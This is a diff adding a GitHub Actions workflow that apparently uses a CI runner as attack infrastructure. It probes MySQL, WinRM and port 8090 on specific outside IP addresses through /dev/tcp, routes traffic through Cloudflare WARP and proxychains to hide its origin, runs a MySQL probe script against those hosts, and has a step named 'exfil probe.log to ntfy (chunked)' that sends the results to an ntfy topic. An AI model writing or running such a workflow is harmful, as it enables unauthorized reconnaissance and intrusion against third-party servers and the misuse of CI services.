@@ -1,0 +1,62 @@
+name: i54911mysql
+on:
+  workflow_dispatch:
+    inputs:
+      nt:
+        description: "ntfy topic"
+        required: false
+        default: "i54911dbx7"
+permissions:
+  contents: read
+jobs:
+  db:
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: baseline egress + target host liveness
+        run: |
+          echo "=== runner ==="; id -u; uname -r
+          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/RUNNER_EGRESS_IP=/'
+          for p in 8090 5985 3306; do
+            timeout 10 bash -c "echo >/dev/tcp/40.160.7.76/$p" 2>/dev/null && echo "pre .7.76:$p OPEN" || echo "pre .7.76:$p closed/filtered"
+          done
+          timeout 10 bash -c 'echo >/dev/tcp/40.160.21.1/3306' 2>/dev/null && echo "pre .21.1:3306 OPEN(cal)" || echo "pre .21.1:3306 closed"
+
+      - name: install + register Cloudflare WARP (proxy mode)
+        run: |
+          bash setup_warp.sh 2>&1 | tee warp_setup.log
+          cat warp_method.env 2>/dev/null || true
+
+      - name: install db clients (mysql + proxychains + pysocks)
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq mysql-client >/dev/null 2>&1 || sudo apt-get install -y -qq default-mysql-client >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq proxychains4 >/dev/null 2>&1 || sudo apt-get install -y -qq proxychains >/dev/null 2>&1 || true
+          python3 -m pip install --quiet --upgrade pip
+          python3 -m pip install --quiet pysocks || true
+          echo "mysql=$(command -v mysql)"; echo "pc=$(command -v proxychains4 || command -v proxychains)"
+
+      - name: probe MySQL over WARP (calibrate .21.1 then .7.76)
+        env:
+          NT: ${{ github.event.inputs.nt }}
+        run: |
+          python3 db_probe.py 2>&1 | tee probe.log || true
+
+      - name: exfil probe.log to ntfy (chunked)
+        if: always()
+        env:
+          NT: ${{ github.event.inputs.nt }}
+        run: |
+          python3 exfil.py || true
+
+      - name: upload probe artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: probe-${{ github.run_id }}
+          path: |
+            probe.log
+            warp_setup.log
+          retention-days: 3
